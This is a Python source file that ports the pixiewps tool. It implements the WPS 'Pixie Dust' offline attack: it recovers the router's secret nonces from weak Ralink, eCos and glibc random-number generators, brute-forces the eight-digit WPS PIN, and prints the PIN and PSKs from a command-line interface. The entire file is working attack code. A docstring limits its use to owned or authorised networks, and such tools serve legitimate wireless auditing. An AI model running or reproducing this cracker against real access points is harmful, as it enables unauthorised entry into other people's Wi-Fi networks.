"""
pixiewps 的纯 Python 忠实移植（GPL-3.0 派生）。

仅依赖标准库。核心算法与 C 原版逐行对应：
  - HMAC-SHA256 / SHA256 由 hashlib 提供（与 LibTomCrypt 实现字节级等价）。
  - 大整数模幂由内建 pow(base, exp, mod) 提供（与 TFM fp_exptmod 等价）。
  - 各 PRNG（Ralink LFSR / eCos LCG / eCos Knuth / glibc random）逐行复刻，
    所有 32 位算术显式 & 0xffffffff 保证回绕一致。

仅供对本人拥有或已获书面授权的网络进行安全审计。禁止用于未授权访问。
"""

from __future__ import annotations

import hashlib
import hmac as _hmac
import struct
import time
from dataclasses import dataclass, field
from typing import List, Optional, Tuple

# ---------------------------------------------------------------------------
# WPS 常量（与 src/wps.h 一致）
# ---------------------------------------------------------------------------
WPS_PIN_LEN = 8
WPS_PKEY_LEN = 192
WPS_HASH_LEN = 32
WPS_AUTHKEY_LEN = 32
WPS_EMSK_LEN = 32
WPS_KEYWRAPKEY_LEN = 16
WPS_NONCE_LEN = 16
WPS_SECRET_NONCE_LEN = 16
WPS_PSK_LEN = 16
WPS_BSSID_LEN = 6

# 破解模式（与 src/pixiewps.h 一致）
NONE = 0
RT = 1            # Ralink / MediaTek / Cameo 等 LFSR
ECOS_SIMPLE = 2   # eCos 线性同余（Broadcom 等）
RTL819x = 3       # Realtek RTL819x（glibc random 时间种子）
ECOS_SIMPLEST = 4  # eCos 最简（实验性）
ECOS_KNUTH = 5    # eCos Knuth / Park-Miller（实验性）
MODE_LEN = 5
MODE3_TRIES = 60 * 10
SEC_PER_DAY = 86400

MODE_NAME = {
    RT: "RT/MT/CL",
    ECOS_SIMPLE: "eCos simple",
    RTL819x: "RTL819x",
    ECOS_SIMPLEST: "eCos simplest",
    ECOS_KNUTH: "eCos Knuth",
}

# RFC 3526 1536-bit MODP 群素数（src/wps.h dh_group5_prime）
DH_GROUP5_PRIME = bytes.fromhex(
    "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
    "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
    "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
    "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
    "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"
    "C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"
    "83655D23DCA3AD961C62F356208552BB9ED529077096966D"
    "670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF"
)

# Key Derivation 盐值（src/wps.h kdf_salt）="Wi-Fi Easy and Secure Key Derivation"
KDF_SALT = b"Wi-Fi Easy and Secure Key Derivation"

# Realtek 已知固定 PKe（src/pixiewps.h wps_rtl_pke），命中即启用 RTL819x 模式
WPS_RTL_PKE = bytes.fromhex(
    "D0141B15656E96B85FCEAD2E8E76330D2B1AC1576BB026E7"
    "A328C0E1BAF8CF91664371174C08EE12EC92B0519C54879F"
    "21255BE5A8770E1FA1880470EF423C90E34D7847A6FCB492"
    "4563D1AF1DB0C481EAD9852C519BF1DD429C163951CF6918"
    "1B132AEA2A3684CAF35BC54ACA1B20C88BB3B7339FF7D56E"
    "09139D77F0AC58079097938251DBBE75E86715CC6B7C0CA9"
    "45FA8DD8D661BEB73B414032798DADEE32B5DD61BF105F18"
    "D89217760B75C5D966A5A490472CEBA9E3B4224F3D89FB2B"
)

# Realtek 私钥（src/pixiewps.h SET_RTL_PRIV_KEY = memset(0x55, 192)）
RTL_PRIV_KEY = b"\x55" * WPS_PKEY_LEN

# glibc random 种子表（src/random/glibc_random_yura.c glibc_seed_tbl）
GLIBC_SEED_TBL = [
    0x0128E83B, 0x00DAFA31, 0x009F4828, 0x00F66443, 0x00BEE24D, 0x00817005, 0x00CB918F,
    0x00A64845, 0x0069C3CF, 0x00A76DBD, 0x0090A848, 0x0057025F, 0x0089126C, 0x007D9A8F,
    0x0048252A, 0x006FB2D4, 0x006CCC15, 0x003C5744, 0x005A998F, 0x005DF917, 0x0032ED77,
    0x00492688, 0x0050E901, 0x002B5F57, 0x003ACD0B, 0x00456B7A, 0x0025413D, 0x002F11F4,
    0x003B564D, 0x00203F14, 0x002589FC, 0x003283F8, 0x001C17E4, 0x001DD823,
]
assert len(GLIBC_SEED_TBL) == 34

# ---------------------------------------------------------------------------
# 基础工具
# ---------------------------------------------------------------------------
MASK32 = 0xFFFFFFFF


def sha256(data: bytes) -> bytes:
    return hashlib.sha256(data).digest()


def hmac_sha256(key: bytes, msg: bytes) -> bytes:
    """标准 HMAC-SHA256（与 src/crypto/hmac_sha256.c 等价）。"""
    return _hmac.new(key, msg, hashlib.sha256).digest()


def hex_to_bytes(s: str) -> bytes:
    """把 hex 串（可含 ':' '-' ' ' 分隔或 0x 前缀）转为字节。"""
    s = s.strip()
    for sep in (":", "-", " "):
        s = s.replace(sep, "")
    s = s.replace("0x", "").replace("0X", "")
    if len(s) % 2 != 0:
        s = "0" + s
    return bytes.fromhex(s)


def bytes_to_hex(b: bytes) -> str:
    return b.hex()


def wps_pin_checksum(pin: int) -> int:
    """WPS PIN 校验位算法（src/wps.h wps_pin_checksum）。"""
    acc = 0
    while pin:
        acc += 3 * (pin % 10)
        pin //= 10
        acc += pin % 10
        pin //= 10
    return (10 - acc % 10) % 10


def wps_pin_valid(pin: int) -> bool:
    return wps_pin_checksum(pin // 10) == (pin % 10)


def check_small_dh_keys(data: bytes) -> bool:
    """判断 PKe == 2（即小 DH 密钥，src/wps.h check_small_dh_keys）。"""
    i = WPS_PKEY_LEN - 2
    while True:
        i -= 1
        if i == 0 or data[i] != 0:
            break
    return i == 0 and data[WPS_PKEY_LEN - 1] == 0x02


# ---------------------------------------------------------------------------
# PRNG 实现（逐行对应 C 源码）
# ---------------------------------------------------------------------------
def ecos_rand_simplest(seed: int) -> Tuple[int, int]:
    """eCos 最简 LCG（src/pixiewps.c ecos_rand_simplest）。"""
    s = (seed * 1103515245 + 12345) & MASK32
    return s, s


def ecos_rand_simple(seed: int) -> Tuple[int, int]:
    """eCos 简单 LCG（src/pixiewps.c ecos_rand_simple）。"""
    s = seed
    s = (s * 1103515245 + 12345) & MASK32
    uret = s & 0xFFE00000
    s = (s * 1103515245 + 12345) & MASK32
    uret = (uret + ((s & 0xFFFC0000) >> 11)) & MASK32
    s = (s * 1103515245 + 12345) & MASK32
    uret = (uret + ((s & 0xFE000000) >> 25)) & MASK32
    return s, uret


def ecos_rand_knuth(seed: int) -> Tuple[int, int]:
    """eCos Knuth（Park-Miller，src/pixiewps.c ecos_rand_knuth）。"""
    res = 48271 * (seed % 44488) - 3399 * (seed // 44488)
    if res < 0:
        res += 2147483647
    return res, res


def ralink_randbyte(sreg: int) -> Tuple[int, int]:
    """Ralink LFSR 向前一步生成一个字节（src/pixiewps.c ralink_randbyte）。"""
    r = 0
    for _ in range(8):
        if sreg & 0x00000001:
            sreg = (((sreg ^ 0x80000057) >> 1) | 0x80000000) & MASK32
            result = 1
        else:
            sreg = (sreg >> 1) & MASK32
            result = 0
        r = (r << 1) | result
    return sreg, r


def ralink_randstate_restore(sreg: int, r: int) -> int:
    """从字节反推 LFSR 状态（src/pixiewps.c ralink_randstate_restore）。"""
    for _ in range(8):
        result = r & 1
        r >>= 1
        if result:
            sreg = ((((sreg << 1) & MASK32) ^ 0x80000057) | 0x00000001) & MASK32
        else:
            sreg = (sreg << 1) & MASK32
    return sreg


def ralink_randbyte_backwards(sreg: int) -> Tuple[int, int]:
    """Ralink LFSR 向后一步生成一个字节（src/pixiewps.c ralink_randbyte_backwards）。"""
    r = 0
    for i in range(8):
        if sreg & 0x80000000:
            sreg = ((((sreg << 1) & MASK32) ^ 0x80000057) | 0x00000001) & MASK32
            result = 1
        else:
            sreg = (sreg << 1) & MASK32
            result = 0
        r |= result << i
    return sreg, r


def glibc_fast_nonce(seed: int) -> List[int]:
    """glibc random 快路径：由种子生成 nonce 的 4 个 32 位字（glibc_random_yura.c）。"""
    seed &= MASK32
    word0 = word1 = word2 = word3 = 0
    for j in range(31):
        word0 = (word0 + seed * GLIBC_SEED_TBL[j + 3]) & MASK32
        word1 = (word1 + seed * GLIBC_SEED_TBL[j + 2]) & MASK32
        word2 = (word2 + seed * GLIBC_SEED_TBL[j + 1]) & MASK32
        word3 = (word3 + seed * GLIBC_SEED_TBL[j + 0]) & MASK32
        seed = (16807 * seed) % 0x7FFFFFFF
    return [word0 >> 1, word1 >> 1, word2 >> 1, word3 >> 1]


def glibc_fast_seed(seed: int) -> int:
    """glibc random 快路径：由种子生成首个 32 位字（glibc_random_yura.c）。"""
    seed &= MASK32
    word0 = 0
    for j in range(3, 33):
        word0 = (word0 + seed * GLIBC_SEED_TBL[j]) & MASK32
        seed = (16807 * seed) % 0x7FFFFFFF
    word0 = (word0 + seed * GLIBC_SEED_TBL[33]) & MASK32
    return word0 >> 1


def rtl_nonce_fill(seed: int) -> bytes:
    """Realtek 由种子生成 16 字节 nonce/ES（src/pixiewps.c rtl_nonce_fill，单次 digit-sum）。"""
    seed &= MASK32
    word0 = word1 = word2 = word3 = 0
    for j in range(31):
        word0 = (word0 + seed * GLIBC_SEED_TBL[j + 3]) & MASK32
        word1 = (word1 + seed * GLIBC_SEED_TBL[j + 2]) & MASK32
        word2 = (word2 + seed * GLIBC_SEED_TBL[j + 1]) & MASK32
        word3 = (word3 + seed * GLIBC_SEED_TBL[j + 0]) & MASK32
        p = 16807 * seed
        seed = ((p >> 31) + (p & 0x7FFFFFFF)) & MASK32
    return struct.pack(">IIII", word0 >> 1, word1 >> 1, word2 >> 1, word3 >> 1)


# ---------------------------------------------------------------------------
# 密钥派生（对应 src/wps.h kdf + src/pixiewps.c 的 DHKey/KDK 计算）
# ---------------------------------------------------------------------------
def kdf(kdk: bytes) -> bytes:
    """KDF（src/wps.h kdf）：输出 AuthKey(32) || KeyWrapKey(16) || EMSK(32) = 96 字节。"""
    kdk_len = (WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN + WPS_EMSK_LEN) * 8
    out = b""
    for i in range(1, 4):
        buf = struct.pack(">I", i) + KDF_SALT + struct.pack(">I", kdk_len)
        out += hmac_sha256(kdk, buf)
    return out


def compute_dhkey(pke: bytes, pkr: bytes, small_dh_keys: bool) -> bytes:
    """DHKey = SHA-256(g^(AB) mod p)。

    - small_dh_keys：私钥 A=1、生成元 g=2 → DHKey = SHA-256(PKe)。
    - RTL819x：私钥 A = 0x55*192 → DHKey = SHA-256(PKe^A mod p)。
    """
    if small_dh_keys:
        return sha256(pke)
    priv = int.from_bytes(RTL_PRIV_KEY, "big")
    p = int.from_bytes(DH_GROUP5_PRIME, "big")
    dh = pow(int.from_bytes(pkr, "big"), priv, p)
    return sha256(dh.to_bytes(WPS_PKEY_LEN, "big"))


def compute_authkey(pke, pkr, e_nonce, r_nonce, e_bssid, small_dh_keys):
    """当未直接提供 AuthKey 时，由 nonce/BSSID 推导（RTL 或小 DH 密钥场景）。"""
    dhkey = compute_dhkey(pke, pkr, small_dh_keys)
    kdk = hmac_sha256(dhkey, e_nonce + e_bssid + r_nonce)
    derived = kdf(kdk)
    return derived[:WPS_AUTHKEY_LEN], dhkey, kdk


# ---------------------------------------------------------------------------
# PIN 破解核心（对应 src/pixiewps.c crack_first_half / crack_second_half）
# ---------------------------------------------------------------------------
def _check_empty_pin_half(authkey, empty_psk, es, pke, pkr, ehash) -> bool:
    buf = es + empty_psk[:WPS_PSK_LEN] + pke + pkr
    return hmac_sha256(authkey, buf) == ehash


def _check_pin_half(authkey, pinhalf: bytes, es, pke, pkr, ehash):
    psk = hmac_sha256(authkey, pinhalf)
    buf = es + psk[:WPS_PSK_LEN] + pke + pkr
    return hmac_sha256(authkey, buf) == ehash, psk[:WPS_PSK_LEN]


def crack_first_half(authkey, empty_psk, es1, pke, pkr, e_hash1):
    """破解 PIN 前 4 位。返回 (状态, 前半字符串, psk1)；状态 1=数字 / -1=空 / 0=未找到。"""
    if _check_empty_pin_half(authkey, empty_psk, es1, pke, pkr, e_hash1):
        return -1, "", empty_psk[:WPS_PSK_LEN]
    for first_half in range(10000):
        pinhalf = ("%04d" % first_half).encode()
        ok, psk = _check_pin_half(authkey, pinhalf, es1, pke, pkr, e_hash1)
        if ok:
            return 1, pinhalf.decode(), psk
    return 0, None, None


def crack_second_half(authkey, empty_psk, es2, pke, pkr, e_hash2, pin_first_half):
    """破解 PIN 后 4 位（含校验位）。返回 (是否找到, 完整 PIN, psk2)。"""
    if pin_first_half == "" and _check_empty_pin_half(authkey, empty_psk, es2, pke, pkr, e_hash2):
        return 1, "", empty_psk[:WPS_PSK_LEN]

    first_half = int(pin_first_half) if pin_first_half else 0

    # 阶段一：后三位 0..999 + 校验位（共 1000 种）
    for second_half in range(1000):
        checksum = wps_pin_checksum(first_half * 1000 + second_half)
        pinhalf = ("%04d" % (second_half * 10 + checksum)).encode()
        ok, psk = _check_pin_half(authkey, pinhalf, es2, pke, pkr, e_hash2)
        if ok:
            return 1, pin_first_half + pinhalf.decode(), psk

    # 阶段二：后四位 0..9999 中不满足校验位的（部分 AP 不校验）
    for second_half in range(10000):
        if wps_pin_valid(first_half * 10000 + second_half):
            continue
        pinhalf = ("%04d" % second_half).encode()
        ok, psk = _check_pin_half(authkey, pinhalf, es2, pke, pkr, e_hash2)
        if ok:
            return 1, pin_first_half + pinhalf.decode(), psk
    return 0, None, None


def _crack(authkey, empty_psk, es1, es2, pke, pkr, e_hash1, e_hash2):
    """完整 PIN 破解（src/pixiewps.c crack）。返回 (是否找到, PIN, psk1, psk2)。"""
    st1, half1, psk1 = crack_first_half(authkey, empty_psk, es1, pke, pkr, e_hash1)
    if not st1:
        return False, None, None, None
    st2, pin, psk2 = crack_second_half(authkey, empty_psk, es2, pke, pkr, e_hash2, half1)
    if not st2:
        return False, None, None, None
    return True, pin, psk1, psk2


# ---------------------------------------------------------------------------
# 结果结构
# ---------------------------------------------------------------------------
@dataclass
class PixieResult:
    found: bool = False
    pin: Optional[str] = None
    mode: Optional[int] = None
    mode_name: Optional[str] = None
    es1: Optional[bytes] = None
    es2: Optional[bytes] = None
    psk1: Optional[bytes] = None
    psk2: Optional[bytes] = None
    authkey: Optional[bytes] = None
    dhkey: Optional[bytes] = None
    kdk: Optional[bytes] = None
    nonce_seed: int = 0
    s1_seed: int = 0
    s2_seed: int = 0
    elapsed: float = 0.0
    warning: str = ""
    notes: List[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# 各模式 PRNG 恢复
# ---------------------------------------------------------------------------
def _try_rt_mode(pke, pkr, e_hash1, e_hash2, authkey, empty_psk, e_nonce):
    """RT 模式：E-S1=E-S2=0 特殊情形 + Ralink LFSR 反推。返回 (found, es1, es2, seed)。"""
    es1 = bytes(WPS_SECRET_NONCE_LEN)
    es2 = bytes(WPS_SECRET_NONCE_LEN)
    ok, pin, psk1, psk2 = _crack(authkey, empty_psk, es1, es2, pke, pkr, e_hash1, e_hash2)
    if ok:
        return True, es1, es2, 0

    # LFSR 反推：先用 nonce 重建状态
    sreg = 0
    for i in range(WPS_NONCE_LEN - 1, -1, -1):
        sreg = ralink_randstate_restore(sreg, e_nonce[i])
    saved = sreg
    j = 0
    for j in range(WPS_NONCE_LEN):
        sreg, byte = ralink_randbyte(sreg)
        if byte != e_nonce[j]:
            break
    if j == WPS_NONCE_LEN - 1:
        # nonce 确由 LFSR 生成，向后回退得到 ES2、ES1
        sreg = saved
        es2 = bytearray(WPS_SECRET_NONCE_LEN)
        for i in range(WPS_SECRET_NONCE_LEN - 1, -1, -1):
            sreg, byte = ralink_randbyte_backwards(sreg)
            es2[i] = byte
        es1 = bytearray(WPS_SECRET_NONCE_LEN)
        for i in range(WPS_SECRET_NONCE_LEN - 1, -1, -1):
            sreg, byte = ralink_randbyte_backwards(sreg)
            es1[i] = byte
        ok, pin, psk1, psk2 = _crack(authkey, empty_psk, bytes(es1), bytes(es2),
                                     pke, pkr, e_hash1, e_hash2)
        if ok:
            return True, bytes(es1), bytes(es2), saved
    return False, None, None, 0


def _try_ecos_simple(pke, pkr, e_hash1, e_hash2, authkey, empty_psk, e_nonce):
    """eCos simple：LCG，利用 nonce 首字节将熵从 32 降到 25 位。

    对应 C：seed = (e_nonce[0] << 25) | counter；匹配 e_nonce[1..15]；
    命中后从「已前进」的状态继续生成 ES1、ES2。
    """
    known = e_nonce[0] << 25
    for counter in range(0x02000000):
        s = (known | counter) & MASK32
        matched = True
        for i in range(1, WPS_NONCE_LEN):
            s, out = ecos_rand_simple(s)
            if e_nonce[i] != (out & 0xFF):
                matched = False
                break
        if matched:
            es1 = bytearray()
            for _ in range(WPS_SECRET_NONCE_LEN):
                s, out = ecos_rand_simple(s)
                es1.append(out & 0xFF)
            es2 = bytearray()
            for _ in range(WPS_SECRET_NONCE_LEN):
                s, out = ecos_rand_simple(s)
                es2.append(out & 0xFF)
            ok, pin, psk1, psk2 = _crack(authkey, empty_psk, bytes(es1), bytes(es2),
                                         pke, pkr, e_hash1, e_hash2)
            if ok:
                return True, bytes(es1), bytes(es2), (known | counter) & MASK32
    return False, None, None, 0


def _try_rtl819x(pke, pkr, e_hash1, e_hash2, authkey, empty_psk, e_nonce, start, end):
    """RTL819x：glibc random 时间种子。在 [end, start] 区间找 nonce 种子，再恢复 ES1/ES2。"""
    randr = struct.unpack(">IIII", e_nonce)
    # 找 nonce 种子
    nonce_seed = 0
    seed = start
    while seed >= end:
        if glibc_fast_seed(seed) == randr[0]:
            if glibc_fast_nonce(seed) == list(randr):
                nonce_seed = seed
                break
        if seed == 0:
            break
        seed -= 1
    if not nonce_seed:
        return False, None, None, 0

    # 恢复 ES1：nonce_seed ± dist（dist 0..MODE3_TRIES）
    def find_es1(seed_candidate):
        es = rtl_nonce_fill(seed_candidate)
        st, half, psk = crack_first_half(authkey, empty_psk, es, pke, pkr, e_hash1)
        return st, half, psk, es

    st, half, psk, es1 = find_es1(nonce_seed)
    s1_seed = nonce_seed
    if not st:
        st, half, psk, es1 = None, None, None, None
        for dist in range(1, MODE3_TRIES + 1):
            st, half, psk, es1 = find_es1(nonce_seed + dist)
            if st:
                s1_seed = nonce_seed + dist
                break
            st, half, psk, es1 = find_es1(nonce_seed - dist)
            if st:
                s1_seed = nonce_seed - dist
                break
    if not st:
        return False, None, None, nonce_seed

    # 恢复 ES2：s1_seed + 0..9
    for j in range(10):
        es2 = rtl_nonce_fill(s1_seed + j)
        ok, pin, psk1, psk2 = _crack(authkey, empty_psk, es1, es2, pke, pkr, e_hash1, e_hash2)
        if ok:
            return True, es1, es2, nonce_seed
    return False, None, None, nonce_seed


def _try_ecos_simplest(pke, pkr, e_hash1, e_hash2, authkey, empty_psk, e_nonce):
    """eCos simplest（实验性，2^32 暴力，纯 Python 极慢，仅显式选择时使用）。"""
    index = 0
    while True:
        s = index
        matched = True
        for i in range(WPS_NONCE_LEN):
            s, out = ecos_rand_simplest(s)
            if e_nonce[i] != (out & 0xFF):
                matched = False
                break
        if matched:
            es1 = bytearray()
            for _ in range(WPS_SECRET_NONCE_LEN):
                s, out = ecos_rand_simplest(s)
                es1.append(out & 0xFF)
            es2 = bytearray()
            for _ in range(WPS_SECRET_NONCE_LEN):
                s, out = ecos_rand_simplest(s)
                es2.append(out & 0xFF)
            ok, pin, psk1, psk2 = _crack(authkey, empty_psk, bytes(es1), bytes(es2),
                                         pke, pkr, e_hash1, e_hash2)
            if ok:
                return True, bytes(es1), bytes(es2), index
        index += 1
        if index == 0xFFFFFFFF:
            break
    return False, None, None, 0


def _try_ecos_knuth(pke, pkr, e_hash1, e_hash2, authkey, empty_psk, e_nonce):
    """eCos Knuth（实验性，2^32 暴力，纯 Python 极慢，仅显式选择时使用）。"""
    index = 0
    while True:
        s = index
        matched = True
        for i in range(WPS_NONCE_LEN):
            s, out = ecos_rand_knuth(s)
            if e_nonce[i] != (out & 0xFF):
                matched = False
                break
        if matched:
            es1 = bytearray()
            for _ in range(WPS_SECRET_NONCE_LEN):
                s, out = ecos_rand_knuth(s)
                es1.append(out & 0xFF)
            es2 = bytearray()
            for _ in range(WPS_SECRET_NONCE_LEN):
                s, out = ecos_rand_knuth(s)
                es2.append(out & 0xFF)
            ok, pin, psk1, psk2 = _crack(authkey, empty_psk, bytes(es1), bytes(es2),
                                         pke, pkr, e_hash1, e_hash2)
            if ok:
                return True, bytes(es1), bytes(es2), index
        index += 1
        if index == 0xFFFFFFFF:
            break
    return False, None, None, 0


# ---------------------------------------------------------------------------
# 顶层攻击入口
# ---------------------------------------------------------------------------
def pixie_attack(
    pke: str,
    pkr: str,
    e_hash1: str,
    e_hash2: str,
    e_nonce: str,
    authkey: Optional[str] = None,
    r_nonce: Optional[str] = None,
    e_bssid: Optional[str] = None,
    small_dh_keys: bool = False,
    mode: Optional[int] = None,
    force: bool = False,
    start: Optional[int] = None,
    end: Optional[int] = None,
    verbosity: int = 0,
    prefer_fast: bool = True,
) -> PixieResult:
    """执行 Pixie Dust 离线攻击。

    参数均为 hex 字符串（可含 ':' 分隔）：
      pke/pkr（192 字节）、e_hash1/e_hash2（32 字节）、e_nonce（16 字节）、
      authkey（32 字节，可选；若省略则需 r_nonce + e_bssid 且为 RTL/小 DH 场景）。

    prefer_fast=True 时，若检测到 Rust 加速引擎（wcracking-engine）则优先走快速路径，
    失败/不可用时自动回退纯 Python 实现。
    """
    # 快速路径：优先使用 Rust 加速引擎（延迟导入避免循环依赖）
    if prefer_fast:
        try:
            from . import fast_engine
            if fast_engine.has_fast_engine():
                fast_res = fast_engine.run_fast(
                    pke=pke, pkr=pkr, e_hash1=e_hash1, e_hash2=e_hash2, e_nonce=e_nonce,
                    authkey=authkey, r_nonce=r_nonce, e_bssid=e_bssid,
                    mode=mode, force=force,
                )
                if fast_res is not None:
                    return fast_res
        except Exception:
            pass

    res = PixieResult()
    t0 = time.time()

    pke_b = hex_to_bytes(pke)
    pkr_b = hex_to_bytes(pkr)
    h1 = hex_to_bytes(e_hash1)
    h2 = hex_to_bytes(e_hash2)
    n1 = hex_to_bytes(e_nonce)

    assert len(pke_b) == WPS_PKEY_LEN, f"PKe 长度错误：{len(pke_b)}"
    assert len(pkr_b) == WPS_PKEY_LEN, f"PKr 长度错误：{len(pkr_b)}"
    assert len(h1) == WPS_HASH_LEN and len(h2) == WPS_HASH_LEN
    assert len(n1) == WPS_NONCE_LEN

    r_nonce_b = hex_to_bytes(r_nonce) if r_nonce else None
    bssid_b = hex_to_bytes(e_bssid) if e_bssid else None

    # 自动探测小 DH 密钥
    if pkr_b is not None and check_small_dh_keys(pkr_b):
        small_dh_keys = True

    # 计算 AuthKey（若未提供）
    authkey_b = None
    dhkey = kdk_ = None
    if authkey:
        authkey_b = hex_to_bytes(authkey)
        assert len(authkey_b) == WPS_AUTHKEY_LEN
    else:
        if not (r_nonce_b and bssid_b):
            res.warning = "缺少 AuthKey 时需提供 r_nonce 与 e_bssid（或改用小 DH 密钥）。"
            res.elapsed = time.time() - t0
            return res
        authkey_b, dhkey, kdk_ = compute_authkey(pke_b, pkr_b, n1, r_nonce_b, bssid_b, small_dh_keys)

    res.authkey = authkey_b
    res.dhkey = dhkey
    res.kdk = kdk_
    empty_psk = hmac_sha256(authkey_b, b"")

    # 模式选择
    if mode is not None:
        p_mode = [mode, NONE, NONE, NONE, NONE]
    else:
        if pke_b == WPS_RTL_PKE:
            p_mode = [RTL819x, NONE, NONE, NONE, NONE]
        else:
            p_mode = [RT]
            if (not (n1[0] & 0x80) and not (n1[4] & 0x80)
                    and not (n1[8] & 0x80) and not (n1[12] & 0x80)):
                p_mode += [RTL819x, ECOS_SIMPLE, NONE]
            else:
                p_mode += [ECOS_SIMPLE, NONE]
        # 补齐到 MODE_LEN
        p_mode += [NONE] * (MODE_LEN - len(p_mode))

    found_mode = NONE
    es1 = es2 = None

    # 自动模式下的特殊情形
    if mode is None:
        # E-S1 = E-S2 = 0
        if pke_b != WPS_RTL_PKE:
            ok, pin, psk1, psk2 = _crack(authkey_b, empty_psk, bytes(16), bytes(16),
                                         pke_b, pkr_b, h1, h2)
            if ok:
                found_mode = RT
                es1 = es2 = bytes(16)
                res.pin, res.psk1, res.psk2 = pin, psk1, psk2
        # E-S1 = E-S2 = N1
        if found_mode == NONE:
            ok, pin, psk1, psk2 = _crack(authkey_b, empty_psk, n1, n1, pke_b, pkr_b, h1, h2)
            if ok:
                found_mode = RTL819x
                es1 = es2 = n1
                res.pin, res.psk1, res.psk2 = pin, psk1, psk2

    # 主循环
    k = 0
    while found_mode == NONE and k < MODE_LEN and p_mode[k] != NONE:
        m = p_mode[k]
        if m == RT:
            ok, e1, e2, seed = _try_rt_mode(pke_b, pkr_b, h1, h2, authkey_b, empty_psk, n1)
            if ok:
                found_mode, es1, es2 = RT, e1, e2
                ok, pin, psk1, psk2 = _crack(authkey_b, empty_psk, es1, es2, pke_b, pkr_b, h1, h2)
                res.pin, res.psk1, res.psk2 = pin, psk1, psk2
                res.nonce_seed = seed
        elif m == ECOS_SIMPLE:
            ok, e1, e2, seed = _try_ecos_simple(pke_b, pkr_b, h1, h2, authkey_b, empty_psk, n1)
            if ok:
                found_mode, es1, es2 = ECOS_SIMPLE, e1, e2
                ok, pin, psk1, psk2 = _crack(authkey_b, empty_psk, es1, es2, pke_b, pkr_b, h1, h2)
                res.pin, res.psk1, res.psk2 = pin, psk1, psk2
                res.nonce_seed = seed
        elif m == RTL819x:
            now = int(time.time())
            st = start if start is not None else now + SEC_PER_DAY
            en = end if end is not None else now - SEC_PER_DAY
            if force:
                st = now + 2 * SEC_PER_DAY
                en = 0
            ok, e1, e2, seed = _try_rtl819x(pke_b, pkr_b, h1, h2, authkey_b, empty_psk, n1, st, en)
            if ok:
                found_mode, es1, es2 = RTL819x, e1, e2
                ok, pin, psk1, psk2 = _crack(authkey_b, empty_psk, es1, es2, pke_b, pkr_b, h1, h2)
                res.pin, res.psk1, res.psk2 = pin, psk1, psk2
                res.nonce_seed = seed
            elif not force:
                res.warning = "AP 可能易受攻击。请尝试 --force 或换用更新的握手数据。"
        elif m == ECOS_SIMPLEST:
            ok, e1, e2, seed = _try_ecos_simplest(pke_b, pkr_b, h1, h2, authkey_b, empty_psk, n1)
            if ok:
                found_mode, es1, es2 = ECOS_SIMPLEST, e1, e2
                ok, pin, psk1, psk2 = _crack(authkey_b, empty_psk, es1, es2, pke_b, pkr_b, h1, h2)
                res.pin, res.psk1, res.psk2 = pin, psk1, psk2
                res.nonce_seed = seed
        elif m == ECOS_KNUTH:
            ok, e1, e2, seed = _try_ecos_knuth(pke_b, pkr_b, h1, h2, authkey_b, empty_psk, n1)
            if ok:
                found_mode, es1, es2 = ECOS_KNUTH, e1, e2
                ok, pin, psk1, psk2 = _crack(authkey_b, empty_psk, es1, es2, pke_b, pkr_b, h1, h2)
                res.pin, res.psk1, res.psk2 = pin, psk1, psk2
                res.nonce_seed = seed
        k += 1

    res.found = found_mode != NONE
    res.mode = found_mode if found_mode != NONE else None
    res.mode_name = MODE_NAME.get(found_mode, "") if found_mode != NONE else None
    res.es1 = es1
    res.es2 = es2
    res.elapsed = time.time() - t0
    return res


# ---------------------------------------------------------------------------
# 命令行入口（兼容 pixiewps 常用参数，便于 GUI 与脚本调用）
# ---------------------------------------------------------------------------
def main(argv: Optional[List[str]] = None) -> int:
    import argparse

    p = argparse.ArgumentParser(description="WCracking — WPS Pixie Dust 离线破解引擎")
    p.add_argument("-e", "--pke", required=True)
    p.add_argument("-r", "--pkr", required=True)
    p.add_argument("-s", "--e-hash1", required=True, dest="e_hash1")
    p.add_argument("-z", "--e-hash2", required=True, dest="e_hash2")
    p.add_argument("-a", "--authkey")
    p.add_argument("-n", "--e-nonce", required=True, dest="e_nonce")
    p.add_argument("-m", "--r-nonce", dest="r_nonce")
    p.add_argument("-b", "--e-bssid", dest="e_bssid")
    p.add_argument("-S", "--dh-small", action="store_true", dest="small_dh_keys")
    p.add_argument("--mode", type=int, choices=[1, 2, 3, 4, 5])
    p.add_argument("-f", "--force", action="store_true")
    p.add_argument("-v", "--verbosity", type=int, default=0)
    args = p.parse_args(argv)

    res = pixie_attack(
        pke=args.pke, pkr=args.pkr, e_hash1=args.e_hash1, e_hash2=args.e_hash2,
        e_nonce=args.e_nonce, authkey=args.authkey, r_nonce=args.r_nonce,
        e_bssid=args.e_bssid, small_dh_keys=args.small_dh_keys, mode=args.mode,
        force=args.force, verbosity=args.verbosity,
    )

    if res.found:
        print(f"[+] WPS pin: {res.pin if res.pin else '<empty>'}")
        if res.mode_name:
            print(f"[?] Mode:    {res.mode} ({res.mode_name})")
        if res.es1:
            print(f"[*] ES1:     {res.es1.hex()}")
        if res.es2:
            print(f"[*] ES2:     {res.es2.hex()}")
        if res.psk1:
            print(f"[*] PSK1:    {res.psk1.hex()}")
        if res.psk2:
            print(f"[*] PSK2:    {res.psk2.hex()}")
    else:
        print("[-] WPS pin not found!")
        if res.warning:
            print(res.warning)
    print(f"\n[*] Time taken: {res.elapsed:.2f} s")
    return 0 if res.found else 1


if __name__ == "__main__":
    raise SystemExit(main())
